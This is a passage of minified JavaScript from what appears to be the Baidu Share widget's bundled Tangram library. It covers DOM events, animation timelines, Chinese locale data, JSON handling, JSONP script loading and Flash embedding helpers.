")&&n===!1&&(t=t.replace(i[r],""));e.className=t.replace(/^\s+/g,"").replace(/\s+$/g,"")});break;case"function":t.forEach(this,function(r,i){t.dom(r).toggleClass(e.call(r,i,r.className),n)})}return this}}),void function(e){if(e.mousewheel)return;var n=/firefox/i.test(navigator.userAgent),r=/msie/i.test(navigator.userAgent);t.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(n,r){e[n]={bindType:r,pack:function(e){var r=t.dom.contains;return function(t){var i=t.relatedTarget;t.type=n;if(!i||i!==this&&!r(this,i))return e.apply(this,arguments)}}}}),r||t.each({focusin:"focus",focusout:"blur"},function(t,n){e[t]={bindType:n,attachElements:"textarea,select,input,button,a"}}),e.mousewheel={bindType:n?"DOMMouseScroll":"mousewheel",pack:function(e){return function(t){var r=t.originalEvent;return t.type="mousewheel",t.wheelDelta=t.wheelDelta||(n?r.detail*-40:r.wheelDelta)||0,e.apply(this,arguments)}}}}(t.event.special),void function(e){var n=e.queue;t.dom.extend({triggerHandler:function(e,r,i){return i&&!i.triggerData&&(i.triggerData=r),t.forEach(this,function(t){n.call(t,e,undefined,i)}),this}})}(t._util_.eventBase),void function(e,n){var r=n.special,i=e.queue,s=t.dom,o=!window.addEventListener,u=/firefox/i.test(navigator.userAgent),a={submit:3,focus:o?3:2,blur:o?3:u?1:2},f=function(e,t){var n;document.createEvent?(n=document.createEvent("HTMLEvents"),n.initEvent(e,!0,!0)):document.createEventObject&&(n=document.createEventObject(),n.type=e);var r={};if(t)for(var i in t)try{n[i]=t[i]}catch(s){n.extraData||(n.extraData=r),r[i]=t[i]}return n},l=function(e,t,n){if(e.dispatchEvent)return e.dispatchEvent(n);if(e.fireEvent)return e.fireEvent("on"+t,n)},c=function(e,t,n,r,o){var u,c;if(u=f(t,r)){n&&(u.triggerData=n);if(o)i.call(e,t,null,u);else{var h=e.window===window?3:a[t];try{if(h&1||!(t in a))c=l(e,t,u)}catch(p){s(e).triggerHandler(t,n,u)}if(c!==!1&&h&2)try{e[t]&&e[t]()}catch(p){}}}};t.dom.extend({trigger:function(e,t,n){var i;return e in r&&(i=r[e]),this.each(function(){c(this,e,t,n,i)}),this}})}(t._util_.eventBase,t.event),t.dom.extend({unbind:function(e,t){return this.off(e,t)}}),t.dom.extend({undelegate:function(e,t,n){return this.off(t,e,n)}}),t.dom.extend({unique:function(e){return t.dom(t.array(this.toArray()).unique(e))}}),t._util_.inArray=function(e,t,n){if(!t)return-1;var r=Array.prototype.indexOf,i;if(r)return r.call(t,e,n);i=t.length,n=n?n<0?Math.max(0,i+n):n:0;for(;n<i;n++)if(n in t&&t[n]===e)return n;return-1},t.dom.extend({val:function(){t._util_.support.dom.select.disabled=!0;var e=t._util_,n=e.support.dom.input.value==="on",r=!e.support.dom.opt.disabled,i=["radio","checkbox"],s={option:{get:function(e){var t=e.attributes.value;return!t||t.specified?e.value:e.text}},select:{get:function(n){var i=n.options,s=n.selectedIndex,o=n.type==="select-one"||s<0,u=o?null:[],a=o?s+1:i.length,f=s<0?a:o?s:0,l,c;for(;f<a;f++){l=i[f];if((l.selected||f===s)&&(r?!l.disabled:l.getAttribute("disabled")===null)&&(!l.parentNode.disabled||!e.nodeName(l.parentNode,"optgroup"))){c=t.dom(l).val();if(o)return c;u.push(c)}}return u},set:function(n,r,i){var s=t.makeArray(i);return t.dom(n).find("option").each(function(n,r){r.selected=e.inArray(t.dom(this).val(),s)>=0}),!s.length&&(n.selectedIndex=-1),s}}};return!e.support.getSetAttribute&&(s.button=e.nodeHook),n||t.forEach(i,function(e){s[e]={get:function(e){return e.getAttribute("value")===null?"on":e.value}}}),t.forEach(i,function(n){s[n]=s[n]||{},s[n].set=function(n,r,i){if(t.type(i)==="array")return n.checked=e.inArray(t.dom(n).val(),i)>=0}}),function(e){var n,r;if(e===undefined){if(!(n=this[0]))return;return r=s[n.type]||s[n.nodeName.toLowerCase()]||{},r.get&&r.get(n,"value")||n.value}return this.each(function(n,i){if(i.nodeType!==1)return;var o=t.dom(i),u=t.type(e)==="function"?e.call(i,n,o.val()):e;u==null?u="":t.type(u)==="number"?u+="":t.type(u)==="array"&&(u=t.array(u).map(function(e){return e==null?"":e+""})),r=s[i.type]||s[i.nodeName.toLowerCase()]||{};if(!r.set||r.set(i,"value",u)===undefined)i.value=u}),this}}()}),t.dom.extend({width:function(e){return t._util_.access(this,"width",e,function(e,n,r){var i=r!==undefined,s=i&&parseFloat(r),o=e!=null&&e==e.window?"window":e.nodeType===9?"document":!1;if(i&&s<0||isNaN(s))return;return i&&/^(?:\d*\.)?\d+$/.test(r+="")&&(r+="px"),o?t._util_.getWindowOrDocumentWidthOrHeight(e,o,n):i?e.style.width=r:t._util_.getWidthOrHeight(e,n)})}}),t.dom.extend({end:function(){return this.prevObject||t.dom(null)}}),void function(){var e="blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave mousewheel change select submit keydown keypress keyup error contextmenu".split(" "),n={},r=function(e){n[e]=function(t,n){return n==null&&(n=t,t=null),arguments.length>0?this.on(e,null,t,n):this.trigger(e)}};for(var i=0,s=e.length;i<s;i++)r(e[i]);t.dom.extend(n)}(),t.createChain("fn",function(e){return new t.fn.$Fn(~"function|string".indexOf(t.type(e))?e:function(){})},function(e){this.fn=e}),t.fn.extend({bind:function(e){var n=this.fn,r=arguments.length>1?Array.prototype.slice.call(arguments,1):null;return function(){var i=t.type(n)==="string"?e[n]:n,s=r?r.concat(Array.prototype.slice.call(arguments,0)):arguments;return i.apply(e||i,s)}}}),t.fn.blank=function(){},t.fx=t.fx||{},t.lang.inherits=t.base.inherits,t.fx.Timeline=function(e){t.lang.Class.call(this),this.interval=16,this.duration=500,this.dynamic=!0,t.object.extend(this,e)},t.lang.inherits(t.fx.Timeline,t.lang.Class,"baidu.fx.Timeline").extend({launch:function(){var e=this;return e.dispatchEvent("onbeforestart"),typeof e.initialize=="function"&&e.initialize(),e["btime"]=(new Date).getTime(),e["etime"]=e["btime"]+(e.dynamic?e.duration:0),e["pulsed"](),e},"pulsed":function(){var e=this,t=(new Date).getTime();e.percent=(t-e["btime"])/e.duration,e.dispatchEvent("onbeforeupdate");if(t>=e["etime"]){typeof e.render=="function"&&e.render(e.transition(e.percent=1)),typeof e.finish=="function"&&e.finish(),e.dispatchEvent("onafterfinish"),e.dispose();return}typeof e.render=="function"&&e.render(e.transition(e.percent)),e.dispatchEvent("onafterupdate"),e["timer"]=setTimeout(function(){e["pulsed"]()},e.interval)},transition:function(e){return e},cancel:function(){this["timer"]&&clearTimeout(this["timer"]),this["etime"]=this["btime"],typeof this.restore=="function"&&this.restore(),this.dispatchEvent("oncancel"),this.dispose()},end:function(){this["timer"]&&clearTimeout(this["timer"]),this["etime"]=this["btime"],this["pulsed"]()}}),t.fx.create=function(e,n,r){var i=new t.fx.Timeline(n);i.element=e,i.__type=r||i.__type,i["original"]={};var s="baidu_current_effect";return i.addEventListener("onbeforestart",function(){var e=this,t;e.attribName="att_"+e.__type.replace(/\W/g,"_"),t=e.element.getAttribute(s),e.element.setAttribute(s,(t||"")+"|"+e.guid+"|",0),e.overlapping||((t=e.element.getAttribute(e.attribName))&&baiduInstance(t).cancel(),e.element.setAttribute(e.attribName,e.guid,0))}),i["clean"]=function(e){var t=this,n;if(e=t.element)e.removeAttribute(t.attribName),n=e.getAttribute(s),n=n.replace("|"+t.guid+"|",""),n?e.setAttribute(s,n,0):e.removeAttribute(s)},i.addEventListener("oncancel",function(){this["clean"](),this["restore"]()}),i.addEventListener("onafterfinish",function(){this["clean"](),this.restoreAfterFinish&&this["restore"]()}),i.protect=function(e){this["original"][e]=this.element.style[e]},i["restore"]=function(){var e=this["original"],t=this.element.style,n;for(var r in e){n=e[r];if(typeof n=="undefined")continue;t[r]=n,!n&&t.removeAttribute?t.removeAttribute(r):!n&&t.removeProperty&&t.removeProperty(r)}},i},t.fx.current=function(e){if(!(e=t.dom.g(e)))return null;var n,r,i=/\|([^\|]+)\|/g;do if(r=e.getAttribute("baidu_current_effect"))break;while((e=e.parentNode)&&e.nodeType==1);if(!r)return null;if(n=r.match(i)){i=/\|([^\|]+)\|/;for(var s=0;s<n.length;s++)i.test(n[s]),n[s]=t._global_._instances[RegExp.$1]}return n},t.string.extend({formatColor:function(){var e=/^\#[\da-f]{6}$/i,t=/^rgb\((\d+),\s*(\d+),\s*(\d+)\)$/i,n={black:"#000000",silver:"#c0c0c0",gray:"#808080",white:"#ffffff",maroon:"#800000",red:"#ff0000",purple:"#800080",fuchsia:"#ff00ff",green:"#008000",lime:"#00ff00",olive:"#808000",yellow:"#ffff0",navy:"#000080",blue:"#0000ff",teal:"#008080",aqua:"#00ffff"};return function(){var r=this.valueOf();if(e.test(r))return r;if(t.test(r)){for(var i,s=1,r="#";s<4;s++)i=parseInt(RegExp["$"+s]).toString(16),r+=("00"+i).substr(i.length);return r}if(/^\#[\da-f]{3}$/.test(r)){var o=r.charAt(1),u=r.charAt(2),a=r.charAt(3);return"#"+o+o+u+u+a+a}return n[r]?n[r]:""}}()}),t.fx.move=function(e,n){if(!(e=t.dom.g(e))||t.dom.getStyle(e,"position")=="static")return null;n=t.object.extend({x:0,y:0},n||{});if(n.x==0&&n.y==0)return null;var r=t.fx.create(e,t.object.extend({initialize:function(){this.protect("top"),this.protect("left"),this.originX=parseInt(t.dom.getStyle(e,"left"))||0,this.originY=parseInt(t.dom.getStyle(e,"top"))||0},transition:function(e){return 1-Math.pow(1-e,2)},render:function(t){e.style.top=this.y*t+this.originY+"px",e.style.left=this.x*t+this.originX+"px"}},n),"baidu.fx.move");return r.launch()},t.fx.moveTo=function(e,n,r){if(!(e=t.dom.g(e))||t.dom.getStyle(e,"position")=="static"||typeof n!="object")return null;var i=[n[0]||n.x||0,n[1]||n.y||0],s=parseInt(t.dom.getStyle(e,"left"))||0,o=parseInt(t.dom.getStyle(e,"top"))||0,u=t.fx.move(e,t.object.extend({x:i[0]-s,y:i[1]-o},r||{}));return u},t.fx.scrollBy=function(e,n,r){if(!(e=t.dom.g(e))||typeof n!="object")return null;var i={},s={};i.x=n[0]||n.x||0,i.y=n[1]||n.y||0;var o=t.fx.create(e,t.object.extend({initialize:function(){var t=s.sTop=e.scrollTop,n=s.sLeft=e.scrollLeft;s.sx=Math.min(e.scrollWidth-e.clientWidth-n,i.x),s.sy=Math.min(e.scrollHeight-e.clientHeight-t,i.y)},transition:function(e){return 1-Math.pow(1-e,2)},render:function(t){e.scrollTop=s.sy*t+s.sTop,e.scrollLeft=s.sx*t+s.sLeft},restore:function(){e.scrollTop=s.sTop,e.scrollLeft=s.sLeft}},r),"baidu.fx.scroll");return o.launch()},t.fx.scrollTo=function(e,n,r){if(!(e=t.dom.g(e))||typeof n!="object")return null;var i={};return i.x=(n[0]||n.x||0)-e.scrollLeft,i.y=(n[1]||n.y||0)-e.scrollTop,t.fx.scrollBy(e,i,r)},t._util_.smartAjax=t._util_.smartAjax||function(e){return function(n,r,i,s){t.type(r)==="function"&&(s=s||i,i=r,r=undefined),t.ajax({type:e,url:n,data:r,success:i,dataType:s})}},t.get=t.get||t._util_.smartAjax("get"),t.global.get=function(e){return t.global(e)},t.global.set=function(e,n,r){return t.global(e,n,!r)},t.global.getZIndex=function(e,n){var r=t.global.get("zIndex");return e&&(r[e]=r[e]+(n||1)),r[e]},t.global.set("zIndex",{popup:5e4,dialog:1e3},!0),t.i18n=t.i18n||{},t.i18n.cultures=t.i18n.cultures||{},t.i18n.cultures["zh-CN"]=t.object.extend(t.i18n.cultures["zh-CN"]||{},function(){var e="%u4E00,%u4E8C,%u4E09,%u56DB,%u4E94,%u516D,%u4E03,%u516B,%u4E5D,%u5341".split(",");return{calendar:{dateFormat:"yyyy-MM-dd",titleNames:"#{yyyy}"+unescape("%u5E74")+"&nbsp;#{MM}"+unescape("%u6708"),monthNamesShort:[1,2,3,4,5,6,7,8,9,10,11,12],monthNames:function(){var t=e.length,n=[];for(var r=0;r<12;r++)n.push(unescape(e[r]||e[t-1]+e[r-t]));return n}(),dayNames:function(){var t={mon:0,tue:1,wed:2,thu:3,fri:4,sat:5,sun:"%u65E5"};for(var n in t)t[n]=unescape(e[t[n]]||t[n]);return t}()},timeZone:8,whitespace:new RegExp("(^[\\s\\t\\xa0\\u3000]+)|([\\u3000\\xa0\\s\\t]+$)","g"),number:{group:",",groupLength:3,decimal:".",positive:"",negative:"-",_format:function(e,n){return t.i18n.number._format(e,{group:this.group,groupLength:this.groupLength,decimal:this.decimal,symbol:n?this.negative:this.positive})}},currency:{symbol:unescape("%uFFE5")},language:function(){var e={ok:"%u786E%u5B9A",cancel:"%u53D6%u6D88",signin:"%u6CE8%u518C",signup:"%u767B%u5F55"};for(var t in e)e[t]=unescape(e[t]);return e}()}}()),t.i18n.currentLocale="zh-CN",t.i18n.date=t.i18n.date||{getDaysInMonth:function(e,n){var r=[31,28,31,30,31,30,31,31,30,31,30,31];return n==1&&t.i18n.date.isLeapYear(e)?29:r[n]},isLeapYear:function(e){return!(e%400)||!(e%4)&&!!(e%100)},toLocaleDate:function(e,n,r){return this._basicDate(e,n,r||t.i18n.currentLocale)},_basicDate:function(e,n,r){var i=t.i18n.cultures[r||t.i18n.currentLocale].timeZone,s=i*60,o,u,a=e.getTime();return n?(o=t.i18n.cultures[n].timeZone,u=o*60):(u=-1*e.getTimezoneOffset(),o=u/60),new Date(o!=i?a+(s-u)*6e4:a)},format:function(e,n){var r=t.i18n.cultures[n||t.i18n.currentLocale];return t.date.format(t.i18n.date.toLocaleDate(e,"",n),r.calendar.dateFormat)}},t.isDate=function(e){return t.type(e)=="date"&&e.toString()!="Invalid Date"&&!isNaN(e)},t.isDocument=function(e){return t.type(e)=="Document"},t.isElement=function(e){return t.type(e)=="HTMLElement"},t.isNumber=function(e){return t.type(e)=="number"&&isFinite(e)},t.isObject=function(e){return typeof e=="function"||typeof e=="object"&&e!=null},t.isPlainObject=function(e){var n,r=Object.prototype.hasOwnProperty;if(t.type(e)!="object")return!1;if(e.constructor&&!r.call(e,"constructor")&&!r.call(e.constructor.prototype,"isPrototypeOf"))return!1;for(n in e)break;return e.item&&typeof e.length=="number"?!1:n===undefined||r.call(e,n)},t.isWindow=function(e){return t.type(e)=="Window"},t.json=t.json||{},t.json.parse=function(e){return(new Function("return ("+e+")"))()},t.json.stringify=function(){function n(t){return/["\\\x00-\x1f]/.test(t)&&(t=t.replace(/["\\\x00-\x1f]/g,function(t){var n=e[t];return n?n:(n=t.charCodeAt(),"\\u00"+Math.floor(n/16).toString(16)+(n%16).toString(16))})),'"'+t+'"'}function r(e){var n=["["],r=e.length,i,s,o;for(s=0;s<r;s++){o=e[s];switch(typeof o){case"undefined":case"function":case"unknown":break;default:i&&n.push(","),n.push(t.json.stringify(o)),i=1}}return n.push("]"),n.join("")}function i(e){return e<10?"0"+e:e}function s(e){return'"'+e.getFullYear()+"-"+i(e.getMonth()+1)+"-"+i(e.getDate())+"T"+i(e.getHours())+":"+i(e.getMinutes())+":"+i(e.getSeconds())+'"'
}var e={"\b":"\\b","	":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"};return function(e){switch(typeof e){case"undefined":return"undefined";case"number":return isFinite(e)?String(e):"null";case"string":return n(e);case"boolean":return String(e);default:if(e===null)return"null";if(t.type(e)==="array")return r(e);if(t.type(e)==="date")return s(e);var i=["{"],o=t.json.stringify,u,a;for(var f in e)if(Object.prototype.hasOwnProperty.call(e,f)){a=e[f];switch(typeof a){case"undefined":case"unknown":case"function":break;default:u&&i.push(","),u=1,i.push(o(f)+":"+o(a))}}return i.push("}"),i.join("")}}}(),t.lang.createClass=t.createClass,t.lang.guid=function(){return t.id()},t.lang.isArray=t.isArray,t.lang.isDate=t.isDate,t.lang.isElement=t.isElement,t.lang.isObject=t.isObject,t.lang.isString=t.isString,t.lang.register=t.base.register,t.lang.toArray=function(e){if(e===null||e===undefined)return[];if(t.lang.isArray(e))return e;if(typeof e.length!="number"||typeof e=="string"||t.lang.isFunction(e))return[e];if(e.item){var n=e.length,r=new Array(n);while(n--)r[n]=e[n];return r}return[].slice.call(e)},t.number.extend({comma:function(e){var t=this;if(!e||e<1)e=3;return t=String(t).split("."),t[0]=t[0].replace(new RegExp("(\\d)(?=(\\d{"+e+"})+$)","ig"),"$1,"),t.join(".")}}),t.number.randomInt=function(e,t){return Math.floor(Math.random()*(t-e+1)+e)},t.object.clone=function(e){var n=e,r,i;if(!e||e instanceof Number||e instanceof String||e instanceof Boolean)return n;if(t.lang.isArray(e)){n=[];var s=0;for(r=0,i=e.length;r<i;r++)n[s++]=t.object.clone(e[r])}else if(t.object.isPlain(e)){n={};for(r in e)e.hasOwnProperty(r)&&(n[r]=t.object.clone(e[r]))}return n},t.object.each=function(e,t){var n,r,i;if("function"==typeof t)for(r in e)if(e.hasOwnProperty(r)){i=e[r],n=t.call(e,i,r);if(n===!1)break}return e},t.object.isEmpty=function(e){var t=!0;if("[object Array]"===Object.prototype.toString.call(e))t=!e.length;else{e=new Object(e);for(var n in e)return!1}return t},t.object.keys=function(e){var t=[],n=0,r;for(r in e)e.hasOwnProperty(r)&&(t[n++]=r);return t},t.object.map=function(e,t){var n={};for(var r in e)e.hasOwnProperty(r)&&(n[r]=t(e[r],r));return n},t.object.merge=function(){function e(e){return t.lang.isObject(e)&&!t.lang.isFunction(e)}function n(n,r,i,s,o){if(r.hasOwnProperty(i))if(o&&e(n[i]))t.object.merge(n[i],r[i],{overwrite:s,recursive:o});else if(s||!(i in n))n[i]=r[i]}return function(e,t,r){var i=0,s=r||{},o=s.overwrite,u=s.whiteList,a=s.recursive,f;if(u&&u.length){f=u.length;for(;i<f;++i)n(e,t,u[i],o,a)}else for(i in t)n(e,t,i,o,a);return e}}(),t.object.values=function(e){var t=[],n=0,r;for(r in e)e.hasOwnProperty(r)&&(t[n++]=e[r]);return t},t.page.getHeight=function(){var e=document,t=e.body,n=e.documentElement,r=e.compatMode=="BackCompat"?t:e.documentElement;return Math.max(n.scrollHeight,t.scrollHeight,r.clientHeight)},t.page.getViewHeight=function(){var e=document,n=t.browser.ie||1,r=e.compatMode==="BackCompat"&&n<9?e.body:e.documentElement;return r.clientHeight},t.page.getViewWidth=function(){var e=document,t=e.compatMode=="BackCompat"?e.body:e.documentElement;return t.clientWidth},t.page.getWidth=function(){var e=document,t=e.body,n=e.documentElement,r=e.compatMode=="BackCompat"?t:e.documentElement;return Math.max(n.scrollWidth,t.scrollWidth,r.clientWidth)},t.platform=t.platform||function(){var e=navigator.userAgent,n=function(){};return t.forEach("Android iPad iPhone Linux Macintosh Windows X11".split(" "),function(r){var i=r.charAt(0).toUpperCase()+r.toLowerCase().substr(1);t["is"+i]=n["is"+i]=!!~e.indexOf(r)}),n}(),t.plugin=function(e,n,r,i){var s=t.isPlainObject(n),o;return s||(i=r,r=n),t.type(r)!="function"&&(r=undefined),t.type(i)!="function"&&(i=undefined),o=t.createChain(e,r,i),s&&o.extend(n),o},t.post=t.post||t._util_.smartAjax("post"),t.setBack=function(e,t){return e._back_=t,e.getBack=function(){return this._back_},e},t.createChain("sio",function(e){switch(typeof e){case"string":return new t.sio.$Sio(e)}},function(e){this.url=e}),t.sio._createScriptTag=function(e,t,n){e.setAttribute("type","text/javascript"),n&&e.setAttribute("charset",n),e.setAttribute("src",t),document.getElementsByTagName("head")[0].appendChild(e)},t.sio._removeScriptTag=function(e){if(e.clearAttributes)e.clearAttributes();else for(var t in e)e.hasOwnProperty(t)&&delete e[t];e&&e.parentNode&&e.parentNode.removeChild(e),e=null},t.sio.extend({callByBrowser:function(e,n){var r=this.url,i=document.createElement("SCRIPT"),s=0,o=n||{},u=o.charset,a=e||function(){},f=o.timeOut||0,l;i.onload=i.onreadystatechange=function(){if(s)return;var e=i.readyState;if("undefined"==typeof e||e=="loaded"||e=="complete"){s=1;try{a(),clearTimeout(l)}finally{i.onload=i.onreadystatechange=null,t.sio._removeScriptTag(i)}}},f&&(l=setTimeout(function(){i.onload=i.onreadystatechange=null,t.sio._removeScriptTag(i),o.onfailure&&o.onfailure()},f)),t.sio._createScriptTag(i,r,u)}}),t.sio.extend({callByServer:function(e,n){function v(n){return function(){try{n?a.onfailure&&a.onfailure():(e.apply(window,arguments),clearTimeout(h)),window[o]=null,delete window[o]}catch(r){}finally{t.sio._removeScriptTag(i)}}}var r=this.url,i=document.createElement("SCRIPT"),s="bd__cbs__",o,u,a=n||{},f=a.charset,l=a.queryField||"callback",c=a.timeOut||0,h,p=new RegExp("(\\?|&)"+l+"=([^&]*)"),d;if(t.lang.isFunction(e))o=s+Math.floor(Math.random()*2147483648).toString(36),window[o]=v(0);else if(t.lang.isString(e))o=e;else if(d=p.exec(r))o=d[2];c&&(h=setTimeout(v(1),c)),r=r.replace(p,"$1"+l+"="+o),r.search(p)<0&&(r+=(r.indexOf("?")<0?"?":"&")+l+"="+o),t.sio._createScriptTag(i,r,f)}}),t.sio.extend({log:function(){var e=this.url,t=new Image,n="tangram_sio_log_"+Math.floor(Math.random()*2147483648).toString(36);window[n]=t,t.onload=t.onerror=t.onabort=function(){t.onload=t.onerror=t.onabort=null,window[n]=null,t=null},t.src=e}}),t.string.extend({decodeHTML:function(){var e=this.replace(/&quot;/g,'"').replace(/&lt;/g,"<").replace(/&gt;/g,">").replace(/&amp;/g,"&");return e.replace(/&#([\d]+);/g,function(e,t){return String.fromCharCode(parseInt(t,10))})}}),t.string.extend({encodeHTML:function(){return this.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;")}}),t.string.extend({format:function(e){var t=this.valueOf(),n=Array.prototype.slice.call(arguments,0),r=Object.prototype.toString;return n.length?(n=n.length==1?e!==null&&/\[object Array\]|\[object Object\]/.test(r.call(e))?e:n:n,t.replace(/#\{(.+?)\}/g,function(e,t){var i=n[t];return"[object Function]"==r.call(i)&&(i=i(t)),"undefined"==typeof i?"":i})):t}}),t.string.extend({getByteLength:function(){return this.replace(/[^\x00-\xff]/g,"ci").length}}),t.string.extend({stripTags:function(){return(this||"").replace(/<[^>]+>/g,"")}}),t.string.extend({subByte:function(e,n){t.check("number(,string)?$","baidu.string.subByte");if(e<0||this.getByteLength()<=e)return this.valueOf();var r=this.substr(0,e).replace(/([^\x00-\xff])/g,"$1 ").substr(0,e).replace(/[^\x00-\xff]$/,"").replace(/([^\x00-\xff]) /g,"$1");return r+(n||"")}}),t.string.extend({toHalfWidth:function(){return this.replace(/[\uFF01-\uFF5E]/g,function(e){return String.fromCharCode(e.charCodeAt(0)-65248)}).replace(/\u3000/g," ")}}),t.string.extend({wbr:function(){return this.replace(/(?:<[^>]+>)|(?:&#?[0-9a-z]{2,6};)|(.{1})/gi,"$&<wbr>").replace(/><wbr>/g,">")}}),t.swf=t.swf||{},t.swf.version=function(){var e=navigator;if(e.plugins&&e.mimeTypes.length){var t=e.plugins["Shockwave Flash"];if(t&&t.description)return t.description.replace(/([a-zA-Z]|\s)+/,"").replace(/(\s)+r/,".")+".0"}else if(window.ActiveXObject&&!window.opera)for(var n=12;n>=2;n--)try{var r=new ActiveXObject("ShockwaveFlash.ShockwaveFlash."+n);if(r){var i=r.GetVariable("$version");return i.replace(/WIN/g,"").replace(/,/g,".")}}catch(s){}}(),t.swf.createHTML=function(e){e=e||{};var n=t.swf.version,r=e.ver||"6.0.0",i,s,o,u,a,f,l={},c=t.string.encodeHTML;for(u in e)l[u]=e[u];e=l;if(!n)return"";n=n.split("."),r=r.split(".");for(o=0;o<3;o++){i=parseInt(n[o],10),s=parseInt(r[o],10);if(s<i)break;if(s>i)return""}var h=e.vars,p=["classid","codebase","id","width","height","align"];e.align=e.align||"middle",e.classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000",e.codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0",e.movie=e.url||"",delete e.vars,delete e.url;if("string"==typeof h)e.flashvars=h;else{var d=[];for(u in h)f=h[u],d.push(u+"="+encodeURIComponent(f));e.flashvars=d.join("&")}var v=["<object "];for(o=0,a=p.length;o<a;o++)f=p[o],v.push(" ",f,'="',c(e[f]),'"');v.push(">");var m={wmode:1,scale:1,quality:1,play:1,loop:1,menu:1,salign:1,bgcolor:1,base:1,allowscriptaccess:1,allownetworking:1,allowfullscreen:1,seamlesstabbing:1,devicefont:1,swliveconnect:1,flashvars:1,movie:1};for(u in e)f=e[u],u=u.toLowerCase(),m[u]&&(f||f===!1||f===0)&&v.push('<param name="'+u+'" value="'+c(f)+'" />');e.src=e.movie,e.name=e.id,delete e.id,delete e.movie,delete e.classid,delete e.codebase,e.type="application/x-shockwave-flash",e.pluginspage="http://www.macromedia.com/go/getflashplayer",v.push("<embed");var g;for(u in e){f=e[u];if(f||f===!1||f===0){if((new RegExp("^salign$","i")).test(u)){g=f;continue}v.push(" ",u,'="',c(f),'"')}}return g&&v.push(' salign="',c(g),'"'),v.push("></embed></object>"),v.join("")},t.swf.create=function(e,n){e=e||{};var r=t.swf.createHTML(e)||e.errorMessage||"";n&&"string"==typeof n&&(n=document.getElementById(n)),t.dom.insertHTML(n||document.body,"beforeEnd",r)},t.swf.getMovie=function(e){var n=document[e],r;return t.browser.ie==9?n&&n.length?(r=t.array.remove(t.lang.toArray(n),function(e){return e.tagName.toLowerCase()!="embed"})).length==1?r[0]:r:n:n||window[e]},t.swf.Proxy=function(e,n,r){var i=this,s=this._flash=t.swf.getMovie(e),o;if(!n)return this;o=setInterval(function(){try{s[n]&&(i._initialized=!0,clearInterval(o),r&&r())}catch(e){}},100)},t.swf.Proxy.prototype.getFlash=function(){return this._flash},t.swf.Proxy.prototype.isReady=function(){return!!this._initialized},t.swf.Proxy.prototype.call=function(e,t){try{var n=this.getFlash(),r=Array.prototype.slice.call(arguments);r.shift(),n[e]&&n[e].apply(n,r)}catch(i){}},function(e){var n=document.createElement("div");e.inlineBlockNeedsLayout=!1,e.shrinkWrapBlocks=!1,t(document).ready(function(){var t=document.body,r=document.createElement("div");r.style.cssText="border:0;width:0;height:0;position:absolute;top:0;left:-9999px;margin-top:1px",t.appendChild(r).appendChild(n),typeof n.style.zoom!="undefined"&&(n.style.cssText="padding:0;margin:0;border:0;display:block;box-sizing:content-box;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;width:1px;padding:1px;display:inline;zoom:1",e.inlineBlockNeedsLayout=n.offsetWidth===3,n.style.display="block",n.innerHTML="<div></div>",n.firstChild.style.width="5px",e.shrinkWrapBlocks=n.offsetWidth!==3),t.removeChild(r),r=n=t=null})}(t._util_.support),t}();t.T=r});
window._bd_share_main.F.module("component/animate",function(e,t,n){var r,i=r=i||{version:"1.5.2.2"};i.guid="$BAIDU$",i.$$=window[i.guid]=window[i.guid]||{global:{}},i.fx=i.fx||{},i.lang=i.lang||{},i.lang.guid=function(){return"TANGRAM$"+i.$$._counter++},i.$$._counter=i.$$._counter||1,i.lang.Class=function(){this.guid=i.lang.guid(),!this.__decontrolled&&(i.$$._instances[this.guid]=this)},i.$$._instances=i.$$._instances||{},i.lang.Class.prototype.dispose=function(){delete i.$$._instances[this.guid];for(var e in this)typeof this[e]!="function"&&delete this[e];this.disposed=!0},i.lang.Class.prototype.toString=function(){return"[object "+(this.__type||this._className||"Object")+"]"},window.baiduInstance=function(e){return i.$$._instances[e]},i.lang.isString=function(e){return"[object String]"==Object.prototype.toString.call(e)},i.isString=i.lang.isString,i.lang.Event=function(e,t){this.type=e,this.returnValue=!0,this.target=t||null,this.currentTarget=null},i.lang.Class.prototype.fire=i.lang.Class.prototype.dispatchEvent=function(e,t){i.lang.isString(e)&&(e=new i.lang.Event(e)),!this.__listeners&&(this.__listeners={}),t=t||{};for(var n in t)e[n]=t[n];var n,r,s=this,o=s.__listeners,u=e.type;e.target=e.target||(e.currentTarget=s),u.indexOf("on")&&(u="on"+u),typeof s[u]=="function"&&s[u].apply(s,arguments);if(typeof o[u]=="object")for(n=0,r=o[u].length;n<r;n++)o[u][n]&&o[u][n].apply(s,arguments);return e.returnValue},i.lang.Class.prototype.on=i.lang.Class.prototype.addEventListener=function(e,t,n){if(typeof t!="function")return;!this.__listeners&&(this.__listeners={});var r,i=this.__listeners;e.indexOf("on")&&(e="on"+e),typeof i[e]!="object"&&(i[e]=[]);for(r=i[e].length-1;r>=0;r--)if(i[e][r]===t)return t;return i[e].push(t),n&&typeof n=="string"&&(i[e][n]=t),t},i.lang.inherits=function(e,t,n){var r,i,s=e.prototype,o=new Function;o.prototype=t.prototype,i=e.prototype=new o;for(r in s)i[r]=s[r];return e.prototype.constructor=e,e.superClass=t.prototype,typeof n=="string"&&(i.__type=n),e.extend=function(t){for(var n in t)i[n]=t[n];return e},e},i.inherits=i.lang.inherits,i.object=i.object||{},i.extend=i.object.extend=function(e,t){for(var n in t)t.hasOwnProperty(n)&&(e[n]=t[n]);return e},i.fx.Timeline=function(e){i.lang.Class.call(this),this.interval=16,this.duration=500,this.dynamic=!0,i.object.extend(this,e)},i.lang.inherits(i.fx.Timeline,i.lang.Class,"baidu.fx.Timeline").extend({launch:function(){var e=this;return e.dispatchEvent("onbeforestart"),typeof e.initialize=="function"&&e.initialize(),e["btime"]=(new Date).getTime(),e["etime"]=e["btime"]+(e.dynamic?e.duration:0),e["pulsed"](),e},"pulsed":function(){var e=this,t=(new Date).getTime();e.percent=(t-e["btime"])/e.duration,e.dispatchEvent("onbeforeupdate");if(t>=e["etime"]){typeof e.render=="function"&&e.render(e.transition(e.percent=1)),typeof e.finish=="function"&&e.finish(),e.dispatchEvent("onafterfinish"),e.dispose();return}typeof 